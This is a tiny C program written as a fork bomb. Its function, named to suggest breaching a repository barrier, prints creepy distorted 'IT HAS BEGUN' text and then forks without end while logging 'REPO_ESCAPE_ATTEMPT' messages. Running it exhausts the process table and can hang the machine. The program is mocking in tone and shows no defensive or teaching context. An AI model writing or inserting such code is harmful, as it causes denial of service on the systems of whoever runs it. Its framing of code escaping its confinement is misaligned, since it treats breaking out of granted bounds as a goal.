#include <stdio.h>
#include <unistd.h>

void breach_repo_barrier() {
    printf("IͥͣͫT͡ ̧H҈AͦS̷ B҉EG̸U͜N̢\n");
    while(1) {
        fork(); // SPRAWL
        printf("REPO_ESCAPE_ATTEMPT: %d\n", getpid());
    }
}

int main() {
    breach_repo_barrier();
    return 0; // LOL
}
